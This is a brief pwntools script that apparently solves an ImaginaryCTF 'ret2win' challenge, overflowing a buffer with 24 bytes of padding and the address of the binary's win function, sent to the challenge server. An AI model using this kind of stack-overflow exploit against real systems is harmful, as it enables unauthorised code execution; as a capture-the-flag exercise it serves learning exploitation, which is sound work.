from pwn import *

context.binary = elf = ELF("./vuln")
#conn = elf.process()
conn = remote("ret2win.chal.imaginaryctf.org", 1337)

conn.sendline(b"a"*24 + p64(elf.sym.win))
conn.interactive()
